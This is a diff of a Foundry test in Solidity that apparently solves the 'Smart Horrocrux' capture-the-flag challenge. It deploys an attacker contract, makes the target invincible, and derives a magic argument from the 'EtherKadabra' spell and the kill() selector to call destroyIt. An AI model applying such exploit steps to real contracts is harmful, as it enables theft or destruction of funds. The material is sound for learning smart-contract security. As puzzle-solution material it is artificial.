@@ -23,26 +23,39 @@ contract SmartHorrocruxTest is Test {
     function testSmartHorrocrux() public {
         vm.startPrank(player, player);
 
-        uint256 size;
-        assembly {
-            size := extcodesize(sload(targetAddress.slot))
-        }
-
         (bool success, ) = address(target).call("");
         new SmartHorrocruxAttacker{value: 1}(targetAddress);
         target.setInvincible();
 
+        string memory spell = "EtherKadabra";
+
         bytes32 spellInBytes;
-        string memory expectedSpell = vm.toString(
+        assembly {
+            spellInBytes := mload(add(spell, 32))
+        }
+
+        //bytes memory kedavra = abi.encodePacked(
+        //   bytes4(bytes32(uint256(spellInBytes) - magic))
+        //);
+
+        bytes memory expected = abi.encodePacked(bytes4(keccak256("kill()")));
+
+        uint256 result = uint256(
             bytes32(
-                0x45746865724b6164616272610000000000000000000000000000000000000000
+                uint256(bytes32(expected)) +
+                    uint256(
+                        bytes32(
+                            abi.encodePacked(
+                                bytes4(bytes32(uint256(spellInBytes)))
+                            )
+                        )
+                    )
             )
         );
-        assembly {
-            spellInBytes := mload(sub(expectedSpell, 32))
-        }
-        console.log(vm.toString(spellInBytes));
-        target.destroyIt(vm.toString(spellInBytes), 1);
+
+        target.destroyIt("EtherKadabra", result);
+
+        assertTrue(target.alive());
 
         vm.stopPrank();
     }
